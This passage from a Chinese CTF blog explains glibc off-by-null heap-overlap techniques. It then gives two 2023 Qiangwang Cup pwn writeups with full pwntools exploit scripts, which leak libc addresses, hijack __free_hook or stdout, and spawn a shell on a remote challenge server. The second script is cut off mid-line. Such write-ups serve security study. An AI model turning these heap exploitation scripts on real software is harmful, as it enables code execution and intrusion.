    <content><![CDATA[<h2 id="2-27版本"><a href="#2-27版本" class="headerlink" title="2.27版本"></a>2.27版本</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>首先是unlink的检查，其实绕过也不是很困难，毕竟在释放的时候程序已经给我们构造好了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>其次是对 prev_size 和 size 的检查。在该检查的过程中，会先找到需要合并的堆块的 size，然后通过 size 找到下面的堆块，检查其 prev_size 是否和 size 相同。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先将需要脱链的堆块释放进入 unsortedbin，然后在申请出来，那么残留的 libc 地址就能够为我们 unlink 提供方便和绕过。接着根据需要脱链堆块的 size 找到下一个堆块然后修改其 prev_size 以绕过检查。最后随便找一个高地址的堆块修改其 prev_size 指向之前构造好的需要合并的堆块，并修改 prev_inuse 为0，释放即可实现堆叠。</p>
<span id="more"></span>

<h2 id="2-29版本以及之后的版本"><a href="#2-29版本以及之后的版本" class="headerlink" title="2.29版本以及之后的版本"></a>2.29版本以及之后的版本</h2><h3 id="检查-1"><a href="#检查-1" class="headerlink" title="检查"></a>检查</h3><p>首先是unlink 脱链对链表的检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>其次是对 prev_size 和 size 的检查。在该检查的过程中，会去除释放的堆块的 prev_size 找到需要合并的堆块，然后检查 prev_size 是否和需要合并堆块的 size 相等，和 2.27 版本有了很大的变化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>主要利用的是 largebin 中的 chunk 残留的 fd_nextsize 和 bk_nextsize 来绕过脱链的检查。学习一下 how2heap 中对于高版本 off-by-null 的利用手法。</p>
<p>首先需要抬高堆地址，使得分配的第一个堆块的地址倒数第二位是\x00字节。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line"><span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line"><span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225182643539.png?imageSlim" alt="image-20231225182643539"></p>
<p>可以看到 topchunk 的地址已经抬高到倒数第二个字节为\x00。</p>
<p>接下来，需要在 largebin 中构造链表布置堆分水。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);				<span class="comment">// chunk to create fake chunk</span></span><br><span class="line"><span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);			<span class="comment">// chunk to overlap</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>

<p>现在的堆布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding</span><br><span class="line">prev Chunk(addr=0x??0010, size=0x510)</span><br><span class="line">victim Chunk(addr=0x??0520, size=0x500)</span><br><span class="line">barrier Chunk(addr=0x??0a20, size=0x20)</span><br><span class="line">a Chunk(addr=0x??0a40, size=0x500)</span><br><span class="line">barrier Chunk(addr=0x??0f40, size=0x20)</span><br><span class="line">b Chunk(addr=0x??0f60, size=0x520)</span><br><span class="line">barrier Chunk(addr=0x??1480, size=0x20)</span><br></pre></td></tr></table></figure>

<p>释放后 largebin 中的链表如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225183550931.png?imageSlim" alt="image-20231225183550931"></p>
<p>接下来把 prev 堆块取出，在其中构造 fake chunk 的 size，以及 victim 的 prev_size。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">*(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225204019821.png?imageSlim" alt="image-20231225204019821"></p>
<p>那么接下来就需要绕过 unlink 的检查，可以看到现在 fake chunk 的 fd 和 bk 分别指向堆块a和堆块b，所以只需要构造 <code>a-&gt;bk</code>和<code>b-&gt;fd</code>指向堆块prev即可。</p>
<p>先来构造<code>b-&gt;fd == fake_chunk</code>，这个只需要将 b 重新申请出来修改就可以了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225204527010.png?imageSlim" alt="image-20231225204527010"></p>
<p>接下来构造<code>a-&gt;bk == fake_chunk</code>，这时候 largebin 中只存在一个堆块a，这时候堆块a的 fd 和 bk 都指到了 libc 上，需要利用 unsortedbin 来重新构造。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line"><span class="built_in">free</span>(a2);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225205054280.png?imageSlim" alt="image-20231225205054280"></p>
<p>最后重新申请出 victim，修改其 prev_inuse 为0，然后释放即可实现堆叠。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225205433162.png?imageSlim" alt="image-20231225205433162"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231225205416432.png?imageSlim" alt="image-20231225205416432"></p>
<p><strong>总结：如果在比赛中遇到，只需要将 victim 修改为需要被覆盖的堆块，然后根据大小修改 size 和 prev_size，以及 fd 和 bk 的偏移即可。</strong></p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Off-By-Null</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 强网杯</title>
    <url>/2023/12/17/CTF/2023%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="chatting"><a href="#chatting" class="headerlink" title="chatting"></a>chatting</h3><p>一道C++的堆体，程序逻辑看起来有点困难，在我的理解看来，就是实现了一个简易的收发信息的功能。利用的漏洞点有两点：一是删除用户后我们仍能够读取到用户的数据，那么就导致堆块被释放后仍然能够被读取，达到泄露 libc 的目的；二是当向不存在的用户发送 6 次消息后，程序会崩溃，报错 tcache double free，那么我们只需要将 tcache 填满然后在 fastbin 上进行 UAF 就可以劫持堆块任意写，是一个难点，比赛的时候测试了好久才成功。</p>
<span id="more"></span>

<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./chatting&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;101.200.122.251&#x27;</span>, <span class="number">14509</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chatting&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;listuser, exit): &#x27;</span>, <span class="string">b&#x27;add&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Enter new username: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;listuser, exit): &#x27;</span>, <span class="string">b&#x27;delete&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Enter username to delete: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">switch</span>(<span class="params">name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;listuser, exit): &#x27;</span>, <span class="string">b&#x27;switch&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Enter username to switch to: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">	sla(<span class="string">&#x27;listuser, exit): &#x27;</span>, <span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">name, size, content</span>):</span><br><span class="line">	sla(<span class="string">&#x27;listuser, exit): &#x27;</span>, <span class="string">b&#x27;message&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;To: &#x27;</span>, <span class="built_in">str</span>(name))</span><br><span class="line">	sla(<span class="string">&#x27;Message size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Enter new username: &#x27;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">message(<span class="string">&#x27;pursue&#x27;</span>, <span class="number">0x460</span>, <span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">message(<span class="string">&#x27;pursue&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">message(<span class="string">&#x27;pursue&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;pursue&#x27;</span>)</span><br><span class="line">read()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;pursue -&gt; pursue: &#x27;</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x3ebca0</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;pursue -&gt; pursue: &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;pursue -&gt; pursue: &#x27;</span>)</span><br><span class="line">heap_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1a880</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;victim&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;pad&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    message(<span class="string">&#x27;pursue&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	message(<span class="string">&#x27;dead&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">switch(<span class="string">&#x27;victim&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	message(<span class="string">&#x27;victim&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">switch(<span class="string">&#x27;pad&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    message(<span class="string">&#x27;pad&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">&#x27;pad&#x27;</span>)</span><br><span class="line">delete(<span class="string">&#x27;victim&#x27;</span>)</span><br><span class="line">message(<span class="string">&#x27;dead&#x27;</span>, <span class="number">0x30</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	message(<span class="string">&#x27;action&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">message(<span class="string">&#x27;action&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	message(<span class="string">&#x27;action&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message(<span class="string">&#x27;action&#x27;</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">delete(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="warmup23"><a href="#warmup23" class="headerlink" title="warmup23"></a>warmup23</h3><p>高版本的 Off-By-Null，需要利用 largebin 中的双向链表来进行绕过，这里就不再赘述了，参考 how2heap 上的实验就可以完成。实现堆叠后，泄露地址，然后进行 tcache 劫持打栈，很常规了。需要注意的是，因为要抬高堆地址使得构造堆块的地址倒数第二个字节是 \x00，所以有概率性。</p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./warmup&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./warmup&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Note: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x6d50</span> - <span class="number">0x8</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x508</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 1 prev</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 7 victim</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 9 a</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0x518</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 11 b</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)      <span class="comment"># 1</span></span><br><span class="line"><span class="comment">#  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x508</span>, flat(<span class="number">0</span>, <span class="string">b&#x27;\xb1\x08\x00\x00\x00\x00&#x27;</span>))    <span class="comment"># 9 prev</span></span><br><span class="line">add(<span class="number">0x518</span>, <span class="string">b&#x27;\x10&#x27;</span>)         <span class="comment"># 11 b</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 13 a</span></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, flat(<span class="number">0</span>, <span class="string">b&#x27;\x10&#x27;</span>))        <span class="comment"># 7 a</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">&#x27;pursue&#x27;</span>)        <span class="comment"># 13 victim</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x8b0</span>))     <span class="comment"># 6</span></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)       <span class="comment"># 13</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 14</span></span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Note: &#x27;</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">heap_base = (key &lt;&lt; <span class="number">12</span>) - <span class="number">0x7000</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">IO_2_1_stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0x91</span>) + p64(IO_2_1_stdout ^ key))</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># 4</span></span><br><span class="line">pld = flat(<span class="number">0xfbad1800</span>, [<span class="number">0</span>] * <span class="number">3</span>, environ, environ + <span 